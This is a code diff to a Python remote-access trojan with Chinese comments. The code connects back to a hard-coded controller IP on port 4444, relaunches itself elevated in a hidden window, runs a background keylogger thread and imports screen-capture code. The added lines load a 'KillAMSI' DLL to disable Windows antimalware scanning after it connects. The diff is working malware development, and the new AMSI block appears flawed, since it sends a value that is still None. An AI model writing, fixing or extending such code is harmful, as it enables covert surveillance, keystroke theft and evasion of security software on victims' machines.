@@ -21,7 +21,7 @@ import datetime
 import ctypes
 from PIL import ImageGrab, Image
 
-IP, PORT = '192.168.0.103', 4444
+IP, PORT = '192.168.0.102', 4444
 
 
 # ============================================================================
@@ -76,7 +76,7 @@ def run_as_admin():
         app_path,       # 要运行的程序路径
         params,         # 命令行参数
         None,           # 工作目录（默认当前）
-        0               # 窗口状态（0 表示隐藏）
+        0               # 显示方式（SW_HIDE=0 隐藏窗口）
     )
     sys.exit()  # 退出当前未提权的进程
 
@@ -88,14 +88,27 @@ if not is_admin():
 threading.Thread(target=background_worker_keylog, daemon=True, name="BackgroundWorker").start()
 threading.Thread(target=background_worker_datetime, daemon=True, name="BackgroundWorker").start()
 
-#废掉AMSI
-killamsi=ctypes.CDLL('./KillAMSI.dll')
-killamsi.KillAmsi.restype = ctypes.c_int
-
 while True:
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((IP, PORT))
+        #废掉AMSI（使用脚本所在目录的绝对路径，避免提权后工作目录变化导致加载失败）
+        amsi_msg = None
+        try:
+            script_dir = os.path.dirname(os.path.abspath(sys.argv[0] if getattr(sys, 'frozen', False) else __file__))
+            dll_path = os.path.join(script_dir, 'KillAMSI.dll')
+            killamsi = ctypes.CDLL(dll_path)
+            killamsi.KillAmsi.restype = ctypes.c_int
+            amsi_ret = killamsi.KillAmsi()
+            if amsi_ret == 0:
+                client.sendall(amsi_msg)
+                ack = client.recv(1024)
+        except Exception as e:
+            try:
+                client.recv(1024)
+            except Exception:
+                pass
+
 
         while True:
             # 只读1字节，防止与后续指令粘包
